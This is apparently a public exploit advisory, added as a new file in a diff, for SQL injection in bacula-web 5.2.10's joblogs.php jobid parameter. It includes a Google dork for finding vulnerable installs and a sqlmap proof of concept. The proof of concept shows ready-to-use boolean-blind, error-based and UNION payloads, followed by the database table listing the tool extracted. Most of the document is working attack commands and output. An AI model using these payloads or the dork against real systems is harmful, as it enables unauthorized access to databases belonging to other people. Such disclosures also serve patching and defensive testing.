@@ -1,0 +1,84 @@
+bacula-web 5.2.10 vulnerability
+
+Bacula-web is an web base application that provide you a summarized view all of the jobs bacula-director.
+
+title : Bacula-web 5.2.10
+godork : "jobid=" bacula-web
+
+
+vulnerability :
++ Sql injection 
+	example : http://target.com/bacula-web/joblogs.php?jobid=99'
+PoC : 
+
+
+		@BlackCyber:/media/data/sqlmap$ python sqlmap.py -u "http://localhost/bacula-web-5.2.10/joblogs.php?jobid=20874" -D bacula --tables --dbms=mysql --level 3 --risk 3 --threads 5 --random-agent
+		
+		    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+		    http://sqlmap.org
+		
+		[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+		
+		[*] starting at 23:25:45
+		
+		[23:25:45] [INFO] fetched random HTTP User-Agent header from file '/media/data/sqlmap/txt/user-agents.txt': Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 Chrome/2.0.172.6 Safari/530.7
+		[23:25:46] [INFO] testing connection to the target URL
+		sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+		---
+		Place: GET
+		Parameter: jobid
+		    Type: boolean-based blind
+		    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
+		    Payload: jobid=20874' RLIKE (SELECT (CASE WHEN (4767=4767) THEN 20874 ELSE 0x28 END)) AND 'aVuC'='aVuC
+		
+		    Type: error-based
+		    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+		    Payload: jobid=20874' AND (SELECT 8355 FROM(SELECT COUNT(*),CONCAT(0x7164667171,(SELECT (CASE WHEN (8355=8355) THEN 1 ELSE 0 END)),0x7162666371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'dams'='dams
+		
+		    Type: UNION query
+		    Title: MySQL UNION query (NULL) - 4 columns
+		    Payload: jobid=20874' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7164667171,0x7950756c6975654b5356,0x7162666371)#
+		---
+		[23:25:47] [INFO] testing MySQL
+		[23:25:48] [WARNING] reflective value(s) found and filtering out
+		[23:25:48] [INFO] confirming MySQL
+		[23:25:50] [INFO] the back-end DBMS is MySQL
+		web server operating system: Linux Debian 6.0 (squeeze)
+		web application technology: PHP 5.3.3, Apache 2.2.16
+		back-end DBMS: MySQL >= 5.0.0
+		[23:25:50] [INFO] fetching tables for database: 'bacula'
+		Database: bacula
+		[24 tables]
+		+----------------+
+		| BaseFiles      |
+		| CDImages       |
+		| Client         |
+		| Counters       |
+		| Device         |
+		| File           |
+		| FileSet        |
+		| Filename       |
+		| Job            |
+		| JobHisto       |
+		| JobMedia       |
+		| Location       |
+		| LocationLog    |
+		| Log            |
+		| Media          |
+		| MediaType      |
+		| PathHierarchy  |
+		| PathVisibility |
+		| Pool           |
+		| Status         |
+		| Storage        |
+		| UnsavedFiles   |
+		| Path           |
+		| Version        |
+		+----------------+
+
+Affected version :
+bacula-web 5.2.10
+links vulnerable http://www.bacula-web.org/download/articles/bacula-web-release-5210.html?file=files/bacula-web.org/downloads/bacula-web-5.2.10.tgz
+
++ Credits :
+all of pemancing ghalau.... /^wishnusakti
